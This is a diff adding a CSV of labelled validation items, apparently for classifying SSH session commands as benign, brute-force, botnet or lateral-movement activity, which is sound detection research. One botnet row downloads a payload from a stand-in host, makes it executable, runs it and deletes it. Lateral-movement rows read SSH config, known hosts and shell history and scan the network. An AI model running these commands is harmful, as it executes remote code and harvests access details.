@@ -1,0 +1,51 @@
+validation_interaction,category,sequence,train_categories,same_category_only
+validation:473,benign,w ; df -h ; ps aux | grep sshd ; hostname,{'benign': 1},True
+validation:384,brute_force,echo ok,{'brute_force': 28},True
+validation:290,benign,uptime ; free -m ; ps aux | grep sshd ; systemctl status ssh,{'benign': 1},True
+validation:235,brute_force,uname -a,{'brute_force': 37},True
+validation:211,brute_force,whoami,{'brute_force': 34},True
+validation:481,brute_force,whoami,{'brute_force': 34},True
+validation:474,brute_force,uname -a,{'brute_force': 37},True
+validation:269,brute_force,uname -a,{'brute_force': 37},True
+validation:16,brute_force,echo ok,{'brute_force': 28},True
+validation:266,brute_force,whoami,{'brute_force': 34},True
+validation:374,brute_force,uname -a,{'brute_force': 37},True
+validation:396,brute_force,uname -a,{'brute_force': 37},True
+validation:464,brute_force,whoami,{'brute_force': 34},True
+validation:31,botnet,cat /proc/cpuinfo ; cd /tmp || cd /var/tmp ; wget http://mirror.example/payload ; chmod 777 payload ; sh payload ; id ; rm -rf payload,{'botnet': 1},True
+validation:13,brute_force,whoami,{'brute_force': 34},True
+validation:461,brute_force,echo ok,{'brute_force': 28},True
+validation:132,brute_force,whoami,{'brute_force': 34},True
+validation:1,lateral_movement,arp -a ; cat ~/.ssh/known_hosts ; ss -tan,{'lateral_movement': 1},True
+validation:213,benign,who ; df -h ; ps aux | grep sshd ; service cron status,{'benign': 1},True
+validation:239,brute_force,whoami,{'brute_force': 34},True
+validation:268,brute_force,echo ok,{'brute_force': 28},True
+validation:504,brute_force,uname -a,{'brute_force': 37},True
+validation:199,brute_force,echo ok,{'brute_force': 28},True
+validation:151,brute_force,whoami,{'brute_force': 34},True
+validation:511,brute_force,uname -a,{'brute_force': 37},True
+validation:475,brute_force,whoami,{'brute_force': 34},True
+validation:236,brute_force,whoami,{'brute_force': 34},True
+validation:275,benign,who ; du -sh /var/log ; ps aux ; systemctl status ssh,{'benign': 2},True
+validation:271,brute_force,echo ok,{'brute_force': 28},True
+validation:567,brute_force,echo ok,{'brute_force': 28},True
+validation:310,brute_force,uname -a,{'brute_force': 37},True
+validation:449,brute_force,whoami,{'brute_force': 34},True
+validation:379,lateral_movement,cat /etc/hosts ; cat ~/.bash_history ; nc -zv 192.0.2.5 22 ; cat ~/.ssh/config ; nmap -sn 192.0.2.0/24,{'lateral_movement': 1},True
+validation:82,brute_force,echo ok,{'brute_force': 28},True
+validation:540,brute_force,uname -a,{'brute_force': 37},True
+validation:4,brute_force,uname -a,{'brute_force': 37},True
+validation:486,benign,w ; du -sh /var/log ; ps aux | grep sshd ; service ssh status,{'benign': 1},True
+validation:309,brute_force,uname -a,{'brute_force': 37},True
+validation:406,brute_force,uname -a,{'brute_force': 37},True
+validation:443,brute_force,whoami,{'brute_force': 34},True
+validation:582,brute_force,whoami,{'brute_force': 34},True
+validation:354,benign,who ; du -sh /var/log ; ps aux ; systemctl status ssh,{'benign': 2},True
+validation:390,benign,uptime ; df -h ; ps aux,{'benign': 2},True
+validation:467,brute_force,uname -a,{'brute_force': 37},True
+validation:447,brute_force,whoami,{'brute_force': 34},True
+validation:118,brute_force,whoami,{'brute_force': 34},True
+validation:35,benign,uptime ; free -m ; service ssh status,{'benign': 1},True
+validation:29,lateral_movement,whoami ; arp -a ; cat ~/.bash_history ; ping -c 2 192.0.2.12,{'lateral_movement': 1},True
+validation:38,brute_force,whoami,{'brute_force': 34},True
+validation:388,brute_force,uname -a,{'brute_force': 37},True
